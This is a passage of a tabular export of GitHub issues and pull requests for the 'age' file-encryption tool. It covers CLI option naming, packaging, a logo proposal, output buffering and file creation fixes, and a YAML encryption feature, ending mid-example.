    -R, --recipients-file PATH  Encrypt to recipients listed at PATH. Can be repeated.
    -i, --identity PATH         Use the identity file at PATH. Can be repeated.
```
## What am I expecting to happen
```
$ age --help
... ommitted ..
Options:
    -r, --recipient RECIPIENT   Encrypt to the specified RECIPIENT. Can be repeated.
    -R, --recipients-file PATH  Encrypt to recipients listed at PATH. Can be repeated.
    -i, --identity IDENTITY     Use the specified IDENTITY. Can be repeated.
    -I, --identity-file PATH    Use the identity file at PATH. Can be repeated.
```",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/193/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/193/comments,https://api.github.com/repos/FiloSottile/age/issues/193/events,https://github.com/FiloSottile/age/issues/193,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/192,813554443,MDU6SXNzdWU4MTM1NTQ0NDM=,192,Graphics design: A logo for 'age'?,64961250,closed,TRUE,NA,NA,3,2021-02-22T14:31:31Z,2021-04-19T00:18:42Z,2021-04-19T00:18:41Z,NONE,NA,"![shinto_torii_fix](https://user-images.githubusercontent.com/64961250/108771495-0c602280-755c-11eb-9d2e-da4ccbc20b8d.png)


Some package repositories wish that a logo is provided for software. Whilst it is not demanded, it can help users to recognize the package they want.

Age introduces itself as being:
> called “age”, which might be an acronym for Actually Good Encryption,
> and it’s pronounced like the Japanese 上げ (with a hard g).
>

Based on its strong Japanese reference I chose to propose a very simplistic logo design:
* a Torii with a a keyhole at its center
> a traditional Japanese gate most commonly found at the entrance of or within a Shinto shrine,
>where it symbolically marks the transition from the mundane to the sacred
> general symbol for security

CC0 - public domain SVG were used to render the above PNG.
https://commons.wikimedia.org/wiki/File:Shinto_torii_icon_vermillion.svg
https://commons.wikimedia.org/wiki/File:Office-protection-shackle-keyhole.svg

Any other logo may be suggested or this idea may be completely scrapped. This is merely the attempt to encourage an actual graphics designer to come up with something we can use, if a logo is wanted.

Examples of good design:
https://github.com/Tox
https://github.com/DNSCrypt/dnscrypt-proxy/blob/master/README.md",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/192/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/192/comments,https://api.github.com/repos/FiloSottile/age/issues/192/events,https://github.com/FiloSottile/age/issues/192,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/191,812872944,MDU6SXNzdWU4MTI4NzI5NDQ=,191,Is it safe to use age for long term storage?,77471692,closed,TRUE,NA,NA,9,2021-02-21T14:53:26Z,2021-04-19T00:11:48Z,2021-04-19T00:11:46Z,NONE,NA,"I see that age is still marked as beta in the releases page, but I'm wondering if it is stable enough for me to (symmetric) encrypt a file with it now, and come back to decrypt it after some years with a new version of age?
 

p.s: thanks for making such a user friendly encryption tool.

",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/191/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/191/comments,https://api.github.com/repos/FiloSottile/age/issues/191/events,https://github.com/FiloSottile/age/issues/191,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/190,812848004,MDU6SXNzdWU4MTI4NDgwMDQ=,190,Packaging: Add age to Chocolatey repository [help needed],64961250,closed,FALSE,NA,NA,5,2021-02-21T12:48:52Z,2021-03-10T15:48:01Z,2021-03-10T15:39:10Z,NONE,NA,"I am currently working with aquacash5 on getting magic-wormhole to the Community Package Repository of Chocolatey.org

Since you provide standalone builds for Windows it would be trivial enough to package these. As per spec the build process are a few powershell oneliners i.e. package, push etc. and providing one XML file with basic data like version number.

A working example of packaging binaries can be seen here:
https://github.com/aquacash5/magic-wormhole-exe/issues/1
Multiple binaries can be packaged in the same fashion and will get automatically shimmed by Chocolatey!

Why:
You provide windows binaries of age and your usage of magic-wormhole gave me the idea to package age as well.

Q:
Would you want to embrace the Windows community further and make age-encryption available through package repositories for the Windows world, that add age to PATH automatically for ease of installation, updating and daily usage?

Who:
Wants to maintain said repo, provided if we want to go that route?

Looking forward to other people wanting to help with this. I'd be happy to see more Go lang and Python CLI programs to enter the Windows ecosystem and more people adopting age in the hope it may become a standard or at least popular alternative for file encryption.

Cheers!

Edit:
https://chocolatey.org/docs/create-packages
https://docs.chocolatey.org/en-us/create/commands/push
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/190/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/190/comments,https://api.github.com/repos/FiloSottile/age/issues/190/events,https://github.com/FiloSottile/age/issues/190,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/189,812040963,MDU6SXNzdWU4MTIwNDA5NjM=,189,FreeBSD pre-built binaries,27628635,closed,FALSE,NA,6688826,0,2021-02-19T13:52:27Z,2021-04-23T02:22:59Z,2021-04-23T02:22:58Z,NONE,NA,Could you please release pre-built binaries for FreeBSD.,NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/189/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/189/comments,https://api.github.com/repos/FiloSottile/age/issues/189/events,https://github.com/FiloSottile/age/issues/189,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/188,809261090,MDExOlB1bGxSZXF1ZXN0NTc0MTUyNzU2,188,Add info about Fedora package,230335,closed,FALSE,NA,NA,1,2021-02-16T12:15:26Z,2021-02-16T12:16:42Z,2021-02-16T12:16:42Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/188/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/188/comments,https://api.github.com/repos/FiloSottile/age/issues/188/events,https://github.com/FiloSottile/age/pull/188,https://api.github.com/repos/FiloSottile/age/pulls/188
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/187,807830955,MDExOlB1bGxSZXF1ZXN0NTcyOTk1NDEz,187,cmg/age: explicitly set output file in tar example,1965208,closed,FALSE,NA,NA,1,2021-02-13T21:16:13Z,2021-04-23T06:44:19Z,2021-04-23T06:44:19Z,NONE,NA,"On some systems (e.g., OpenBSD) stdout is not the default output for tar. Even on Linux the default if the environment variable TAPE is not set is the compiled-in default (which often is stdout, but doesn't have to be).

This commit changes the example to make it work accross a wider range of systems.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/187/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/187/comments,https://api.github.com/repos/FiloSottile/age/issues/187/events,https://github.com/FiloSottile/age/pull/187,https://api.github.com/repos/FiloSottile/age/pulls/187
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/186,803854929,MDExOlB1bGxSZXF1ZXN0NTY5NzEzNDg1,186,.github/workflows: add Go 1.16rc1 and build darwin/arm64 binaries,1225294,closed,FALSE,NA,NA,0,2021-02-08T19:24:55Z,2021-03-09T23:51:05Z,2021-03-09T23:51:05Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/186/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/186/comments,https://api.github.com/repos/FiloSottile/age/issues/186/events,https://github.com/FiloSottile/age/pull/186,https://api.github.com/repos/FiloSottile/age/pulls/186
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/185,803837602,MDU6SXNzdWU4MDM4Mzc2MDI=,185,master branch history briefly rewritten,1225294,closed,FALSE,NA,NA,0,2021-02-08T19:00:43Z,2021-02-08T19:00:47Z,2021-02-08T19:00:47Z,OWNER,NA,"I ran a history rewrite with unmodified tree to make it possible to tag v1.0.0-beta.7 without CLI changes.

```
$ git revise -i v1.0.0-beta6
pick   50b61862d668  HomebrewFormula: update to v1.0.0-beta6 (#180)
pick   15df6e2cf71b  internal/format: require the last line of stanzas to be short
pick   6546df3baca4  age: remove Type method from Recipient and Identity interfaces
pick   0fa220e4d757  age: remove IdentityMatcher
pick   f04064a41bfd  age: add NoIdentityMatchError
pick   bc434bd3ea7d  age: make Identity and Recipient work on multiple stanzas
fixup  5d96bfa9a9e6  age: make Identity and Recipient work on multiple stanzas
pick   19e87b75b75d  cmd/age: expand test vectors suite
pick   6da7d26b4dc9  all: add .gitattributes to protect .age files from autocrlf
pick   225044b061de  cmd/age: automatically load default SSH key paths
Updating refs/heads/master (3f9d63be4d1c6541bb2cdec3b2e3e9c1fd2489f2 => 225044b061de1f11e60ffe1bf460a6dbf3cdf061)
```

Filing an issue just to have a record.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/185/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/185/comments,https://api.github.com/repos/FiloSottile/age/issues/185/events,https://github.com/FiloSottile/age/issues/185,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/184,796525915,MDExOlB1bGxSZXF1ZXN0NTYzNjkxNjI1,184,Bump x/crypto to bring in newer x/sys/unix,68368,closed,FALSE,NA,NA,2,2021-01-29T02:32:43Z,2021-03-10T10:38:48Z,2021-03-10T10:38:48Z,NONE,NA,"golang.org/x/sys@v0.0.0-20190412213103-97732733099d is missing support for
OpenBSD/arm64. By bumping x/crypto to the latest version, we can get a x/sys
that works.

Here is the build failure from the OpenBSD build machine:

  http://build-failures.rhaalovely.net/aarch64/2021-01-24/security/age.log",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/184/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/184/comments,https://api.github.com/repos/FiloSottile/age/issues/184/events,https://github.com/FiloSottile/age/pull/184,https://api.github.com/repos/FiloSottile/age/pulls/184
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/183,792386985,MDExOlB1bGxSZXF1ZXN0NTYwMjc5NDc3,183,Add Fedora installation instructions,30413512,closed,FALSE,NA,NA,3,2021-01-23T00:21:58Z,2021-04-23T06:10:30Z,2021-04-23T06:10:03Z,CONTRIBUTOR,NA,I read an article in [latacora](https://latacora.micro.blog/2019/07/16/the-pgp-problem.html) about GPG shortcomings and it mentioned Age at the end. Since it was not yet packaged or Fedora I decided to add it. It should be available within 10 days after a period in testing.,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/183/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/183/comments,https://api.github.com/repos/FiloSottile/age/issues/183/events,https://github.com/FiloSottile/age/pull/183,https://api.github.com/repos/FiloSottile/age/pulls/183
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/182,791456530,MDU6SXNzdWU3OTE0NTY1MzA=,182,Use pinentry if available,485778,open,FALSE,NA,NA,0,2021-01-21T20:07:06Z,2021-04-19T00:19:22Z,NA,NONE,NA,"rage has `pinentry` support: https://github.com/str4d/rage/pull/64

It would be great if `age` could have it too.

From yubikey-agent it seems that it can be done using: github.com/gopasspw/gopass/pkg/pinentry

https://github.com/FiloSottile/yubikey-agent/blob/4998d8c3d76cbfa97fd1af2953d8eea36ae290e8/main.go",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/182/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/182/comments,https://api.github.com/repos/FiloSottile/age/issues/182/events,https://github.com/FiloSottile/age/issues/182,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/181,791371936,MDU6SXNzdWU3OTEzNzE5MzY=,181,Export parseSSHIdentity,153052,open,FALSE,NA,NA,0,2021-01-21T17:54:21Z,2021-04-19T00:15:04Z,NA,NONE,NA,"I'm using `age` as a lib and I'd like to replicate the behavior of loading keys found at`~/.ssh/id_(rsa|ed25519)`.

To do so right now I had to copy `parseSSHIdentity`, `readPubFile` and `readPassphrase` in my project.

It would be helpful if parseSSHIdentity was exported.

Cheers.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/181/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/181/comments,https://api.github.com/repos/FiloSottile/age/issues/181/events,https://github.com/FiloSottile/age/issues/181,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/180,790612425,MDExOlB1bGxSZXF1ZXN0NTU4Nzk1Mjkw,180,bump homebrew formula to beta6,263424,closed,FALSE,NA,NA,1,2021-01-21T01:56:28Z,2021-01-21T11:04:08Z,2021-01-21T11:04:03Z,CONTRIBUTOR,NA,works locally; makes it easier to play with,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/180/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/180/comments,https://api.github.com/repos/FiloSottile/age/issues/180/events,https://github.com/FiloSottile/age/pull/180,https://api.github.com/repos/FiloSottile/age/pulls/180
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/179,789081362,MDExOlB1bGxSZXF1ZXN0NTU3NDc5MjMy,179,README: add instructions for installing via MacPorts,618376,closed,FALSE,NA,NA,3,2021-01-19T14:41:49Z,2021-04-23T12:29:01Z,2021-04-23T06:12:51Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/179/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/179/comments,https://api.github.com/repos/FiloSottile/age/issues/179/events,https://github.com/FiloSottile/age/pull/179,https://api.github.com/repos/FiloSottile/age/pulls/179
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/178,782688836,MDU6SXNzdWU3ODI2ODg4MzY=,178,spec: Migrate the specification into a plain text document,42150522,closed,TRUE,NA,NA,0,2021-01-09T21:31:06Z,2021-04-19T00:22:23Z,2021-04-19T00:22:22Z,CONTRIBUTOR,NA,"I find it inconvenient, that the specification is a Google Docs document. I would perefer the specification to be a simple text document, version controlled with `git`. Those are the drawback, that I see with Google Docs:

- Proposing changes is less clear and less convenient than a pull request would be.
- I cannot see the ""true history"" of the document and must rely on the ""Changes"" section.
- The PRIMARY selection (""middle-mouse-button-clipboard"") does not work. This is merely an annoyance, but one I encountered repeatedly.
- Google Docs is slow (yes, this is a real complaint - on OpenBSD Firefox is quite slow on JavaScript heavy webpages).
- I cannot `grep` through the document.
- Following links seems somewhat cumbersome to me.

I would suggest creating a separate repository for the specification, because it should be independent of the Go implementation. In case you want to do this, I have already prepared a repo for you to fork: https://github.com/codesoap/age-spec. The redirect of https://age-encryption.org/v1 would need to be changed afterwards.",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/178/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/178/comments,https://api.github.com/repos/FiloSottile/age/issues/178/events,https://github.com/FiloSottile/age/issues/178,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/177,781497797,MDExOlB1bGxSZXF1ZXN0NTUxMjExMDYx,177,cmd/age-keygen: add --output option as an alias for -o,6942,closed,FALSE,NA,NA,1,2021-01-07T17:54:03Z,2021-01-07T18:21:22Z,2021-01-07T18:20:56Z,CONTRIBUTOR,NA,"`age-keygen` didn't support the `--output` option it documented -- the option simply wasn't defined. This PR fixes that.

The whitespace change is to make the structure of `cmd/age-keygen.main` more closely match the structure of `cmd/age.main`.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/177/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/177/comments,https://api.github.com/repos/FiloSottile/age/issues/177/events,https://github.com/FiloSottile/age/pull/177,https://api.github.com/repos/FiloSottile/age/pulls/177
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/176,780729502,MDExOlB1bGxSZXF1ZXN0NTUwNTc2MTgw,176,cmd/age: Improve decision on when to buffer output,42150522,closed,FALSE,NA,NA,2,2021-01-06T17:38:51Z,2021-01-07T21:51:44Z,2021-01-07T21:51:44Z,CONTRIBUTOR,NA,"Previously output was buffered when `--armor` was set and the output was a TTY. It was not checked whether the input was a TTY, decryption was not taken into account and binary output was not buffered either. This lead to some problems:

1.: `dd if=/dev/urandom bs=1M count=300 | age -r age1... -a` caused `fatal error: runtime: out of memory` (increase count if it doesn't for you). No one will encrypt this much to stdout, but buffering is unnecessary here.

2.: Output was not buffered for `age -d` (when pasting some armored input into the TTY as input). Admittedly this only happens when copy and pasting a lot of input (ca. 70k bytes for me), but it still seems wrong. Here is how I can make the problem visible:
```
yes 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.' \
| dd bs=1k count=70 \
| age -a -r age1... \
| xclip -i

# Paste with middle mouse button here:
age -d -i mykey
```

3.: Output was not buffered when encrypting and forcing binary output with `age -r age1... -o -`. Of course this is also something most people wouldn't do.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/176/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/176/comments,https://api.github.com/repos/FiloSottile/age/issues/176/events,https://github.com/FiloSottile/age/pull/176,https://api.github.com/repos/FiloSottile/age/pulls/176
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/175,777667238,MDExOlB1bGxSZXF1ZXN0NTQ3OTAwNTQw,175,cmd/age: improve user documentation,42150522,closed,FALSE,NA,NA,0,2021-01-03T16:06:37Z,2021-01-04T19:56:36Z,2021-01-04T19:05:34Z,CONTRIBUTOR,NA,"Shows where `-R`/`--recipients-file` can be used, adds `-R`/`--recipients-file` to missing-recipient hint, and mention the possibility to use `-` with `-i`.

The `(-r RECIPIENT | -R PATH)...` syntax indicates that either `-r` or `-R` can be used (via `( | )`) and that these arguments may be provided multiple times (via `...`). I believe this is the most common way to represent this in usage texts. I like to take a look at http://docopt.org/ when writing usage texts.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/175/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/175/comments,https://api.github.com/repos/FiloSottile/age/issues/175/events,https://github.com/FiloSottile/age/pull/175,https://api.github.com/repos/FiloSottile/age/pulls/175
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/174,777650958,MDExOlB1bGxSZXF1ZXN0NTQ3ODg4NDY1,174,.github/workflows: include LICENSE in binary builds,1225294,closed,FALSE,NA,NA,0,2021-01-03T14:40:53Z,2021-01-06T12:49:58Z,2021-01-06T12:49:57Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/174/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/174/comments,https://api.github.com/repos/FiloSottile/age/issues/174/events,https://github.com/FiloSottile/age/pull/174,https://api.github.com/repos/FiloSottile/age/pulls/174
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/173,777642567,MDExOlB1bGxSZXF1ZXN0NTQ3ODgyNDgw,173,Changes from the January 2nd livestream,1225294,closed,FALSE,NA,NA,0,2021-01-03T13:55:05Z,2021-01-03T14:10:23Z,2021-01-03T14:10:22Z,OWNER,NA,"A bunch of changes that I wrote while livestreaming on Saturday.

https://www.twitch.tv/videos/858530077

You can also ready the rationale for the recipient files decision here:
https://groups.google.com/g/age-dev/c/StmWsOyb-H8/m/hcnHqqOlCAAJ",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/173/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/173/comments,https://api.github.com/repos/FiloSottile/age/issues/173/events,https://github.com/FiloSottile/age/pull/173,https://api.github.com/repos/FiloSottile/age/pulls/173
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/172,777537455,MDExOlB1bGxSZXF1ZXN0NTQ3ODA2Njc5,172,Update GitHub Actions workflows,1225294,closed,FALSE,NA,NA,0,2021-01-02T22:46:41Z,2021-01-02T23:28:05Z,2021-01-02T23:28:04Z,OWNER,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/172/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/172/comments,https://api.github.com/repos/FiloSottile/age/issues/172/events,https://github.com/FiloSottile/age/pull/172,https://api.github.com/repos/FiloSottile/age/pulls/172
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/171,777535099,MDExOlB1bGxSZXF1ZXN0NTQ3ODA1MTAx,171,.github/workflows: add build.yml,1225294,closed,FALSE,NA,NA,0,2021-01-02T22:27:36Z,2021-01-02T22:41:47Z,2021-01-02T22:41:46Z,OWNER,NA,"Fixes #164
Fixes #148
Fixes #133
Closes #25",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/171/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/171/comments,https://api.github.com/repos/FiloSottile/age/issues/171/events,https://github.com/FiloSottile/age/pull/171,https://api.github.com/repos/FiloSottile/age/pulls/171
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/170,777220228,MDU6SXNzdWU3NzcyMjAyMjg=,170,Way to detect age key type of an encrypted file?,58356365,closed,TRUE,NA,NA,1,2021-01-01T06:33:12Z,2021-04-19T00:37:57Z,2021-04-19T00:37:56Z,NONE,NA,"<!-- This is the issue tracker of a specific implementation of
the age format, which is specified at https://age-encryption.org/v1

Please consider using the mailing list to discuss the specification:

                https://age-encryption.org/ml                    -->

To determine the key type of an encrypted secret, currently I am reading the file's header.  
If you open an encrypted file in a text editor it will clearly show `-> ssh-rsa ...`, `-> scrypt ...`, etc on the second line.

Is this the proper way of determining a secret's key type (reading the raw header of the secret, and checking it) or is there a function within the spec/library to do this for me?

Or is it instead advised that I should enforce a specific key type for secrets in my projects?",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/170/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/170/comments,https://api.github.com/repos/FiloSottile/age/issues/170/events,https://github.com/FiloSottile/age/issues/170,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/169,776910556,MDExOlB1bGxSZXF1ZXN0NTQ3MzE5NDEx,169,age: create outfile as late as possible,42150522,closed,FALSE,NA,NA,2,2020-12-31T10:30:22Z,2021-01-03T15:12:14Z,2021-01-03T14:10:28Z,CONTRIBUTOR,NA,"`age` creates empty output files, when something goes wrong. Examples:
1. With `age -p -o data.age data` when I enter non matching passphrases.
2. With `age -d -o data data.age` when I enter the wrong passphrase.
3. With `age -d -i key -o data data.age` when I provided the wrong secret key.

This pull requests ensures, that the output file is created as late as possible and thus avoids the creation of empty files for the given examples. Unfortunately this leads to some boilerplate, but I feel like it's not too bad.

One drawback is that the user is now informed later about already existing output files. Thus they may have already entered a password, only to be informed that the output file already exists and won't be overwritten. This could be prevented by checking if the file exists in advance. Let me know if you want this implemented.

This pull request should resolve #159 and to some extend #57.
",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/169/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/169/comments,https://api.github.com/repos/FiloSottile/age/issues/169/events,https://github.com/FiloSottile/age/pull/169,https://api.github.com/repos/FiloSottile/age/pulls/169
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/168,776677090,MDExOlB1bGxSZXF1ZXN0NTQ3MTIwMDI3,168,age: add missing -p to usage text,42150522,closed,FALSE,NA,NA,1,2020-12-30T23:31:54Z,2021-01-03T14:10:26Z,2021-01-03T14:10:26Z,CONTRIBUTOR,NA,"I was initially not sure, whether this flag should only be used for encryption or for both encryption and decryption. This change would have prevented my confusion.",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/168/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/168/comments,https://api.github.com/repos/FiloSottile/age/issues/168/events,https://github.com/FiloSottile/age/pull/168,https://api.github.com/repos/FiloSottile/age/pulls/168
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/167,776433015,MDExOlB1bGxSZXF1ZXN0NTQ2OTI3MTg1,167,armor: add basic benchmarks,42150522,closed,FALSE,NA,NA,7,2020-12-30T12:28:46Z,2021-01-03T17:44:21Z,2021-01-03T14:10:27Z,CONTRIBUTOR,NA,"I wrote this benchmark, so that I could use `cd armor && go test -bench=Write -cpuprofile out.prof`, because I wanted to find out why encryption with armor is slower than `gpg`. Unfortunately I came to the conclusion, that most time is spend in the base64 package, so I can't do much here and don't need this benchmark anymore.

I create this pull request anyway, in case it is considered useful for potential future investigations. ",NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/167/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/167/comments,https://api.github.com/repos/FiloSottile/age/issues/167/events,https://github.com/FiloSottile/age/pull/167,https://api.github.com/repos/FiloSottile/age/pulls/167
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/166,773079025,MDU6SXNzdWU3NzMwNzkwMjU=,166,"cannot use age as module,",50611,closed,FALSE,NA,NA,0,2020-12-22T16:30:24Z,2020-12-22T16:30:29Z,2020-12-22T16:30:29Z,NONE,NA,"## Environment

* OS:
* age version:

## What were you trying to do

## What happened

```
<insert terminal transcript here>
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/166/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/166/comments,https://api.github.com/repos/FiloSottile/age/issues/166/events,https://github.com/FiloSottile/age/issues/166,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/165,769267650,MDExOlB1bGxSZXF1ZXN0NTQxNDM1NzA2,165,Recipient file support,153052,closed,FALSE,NA,NA,4,2020-12-16T20:59:51Z,2021-01-03T14:10:24Z,2021-01-03T14:10:24Z,NONE,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/165/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/165/comments,https://api.github.com/repos/FiloSottile/age/issues/165/events,https://github.com/FiloSottile/age/pull/165,https://api.github.com/repos/FiloSottile/age/pulls/165
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/164,766662919,MDU6SXNzdWU3NjY2NjI5MTk=,164,Missing binaries?,3750059,closed,FALSE,NA,6688826,4,2020-12-14T16:02:19Z,2021-04-22T17:50:23Z,2021-01-02T22:41:45Z,NONE,NA,"Not sure if this is the right place to report this as it is more of a UX problem with the web page (Github README) rather than with the 'age' tool itself.

The README states:

> On Windows, Linux, and macOS, you can use the pre-built binaries.


This links to: https://github.com/FiloSottile/age/releases

At a first glance, this page does not contain any prebuilt binaries.
It instead contains a list of release notes.
these release notes have the source code attached as an asset.

On Dec 27, 2019, one of the release notes does indeed contain more files, presumably the prebuilt binaries for this release.
However, this is a rather old release. 

I would suggest the following improvement.

Either 1) have the text below link to a page that contains only a directory listing of the prebuild binaries of the most recent versions.

> On Windows, Linux, and macOS, you can use the pre-built binaries.

or 2) have the  README itself link directly to the prebuilt binaries for the most recent versions for various OS versions. And then provide a link to historic versions as well.

Both these improvements will make it easier for new users to obtain a copy of 'age'. 

",NA,FALSE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/164/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/164/comments,https://api.github.com/repos/FiloSottile/age/issues/164/events,https://github.com/FiloSottile/age/issues/164,NA
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/163,760115802,MDExOlB1bGxSZXF1ZXN0NTM1MDAxNjg2,163,fixed function documentation,8426497,closed,FALSE,NA,NA,1,2020-12-09T08:22:04Z,2021-01-03T14:26:48Z,2021-01-03T14:26:48Z,CONTRIBUTOR,NA,it seems that r.c was renamed to r.src,NA,TRUE,https://api.github.com/repos/FiloSottile/age,https://api.github.com/repos/FiloSottile/age/issues/163/labels{/name},https://api.github.com/repos/FiloSottile/age/issues/163/comments,https://api.github.com/repos/FiloSottile/age/issues/163/events,https://github.com/FiloSottile/age/pull/163,https://api.github.com/repos/FiloSottile/age/pulls/163
FiloSottile,age,https://api.github.com/repos/FiloSottile/age/issues/162,757483276,MDExOlB1bGxSZXF1ZXN0NTMyODUyOTYy,162,Implement in place YAML encrypting/decrypting,153052,closed,FALSE,NA,NA,6,2020-12-05T00:04:18Z,2021-04-03T12:55:23Z,2021-04-03T12:55:22Z,NONE,NA,"I think there is a great lack of a tooling which would allow in place encrypting/decrypting of YAML data.

Working the Ops side of DevOps I have a lot of YAML (mostly kubernetes manifests) with sensitive data I'd like to encrypt so that I can give access to the repos holding those manifests to my whole R&D.

Implemented in this PR:
- Choose value rendering with tag attributes
- Comment support for encrypted values
- Anchor support
- Multiple documents support

```shell
$ cat test.yml
---
hey1: !crypto/age This is a string
hey2: &hey2 !crypto/age:SingleQuoted This is a single quoted string
# This is a head comment
hey3:
  subhey: !crypto/age:DoubleQuoted ""This is a double quoted string"" # this is a line comment
  # This is a foot comment
hey4: !crypto/age:Literal This is a literal string
hey5: !crypto/age:Folded This is a folded string
hey6: *hey2
---
hey1: !crypto/age:NoTag This is a string with no tag
hey2: !crypto/age:SingleQuoted,NoTag This is a single quoted string with no tag
hey3: !crypto/age:DoubleQuoted,NoTag ""This is a double quoted string with no tag""
hey4: !crypto/age:Literal,NoTag This is a literal string with no tag
hey5: !crypto/age:Folded,NoTag This is a folded string with no tag
```

```shell
$ age -R ~/.ssh/id_ed25519.pub -y test.yaml
hey1: !crypto/age |
  -----BEGIN AGE ENCRYPTED FILE-----
  YWdlLWVuY3J5cHRpb24ub3JnL3YxCi0+IHNzaC1lZDI1NTE5IGYxc1ZMQSB1dkZV
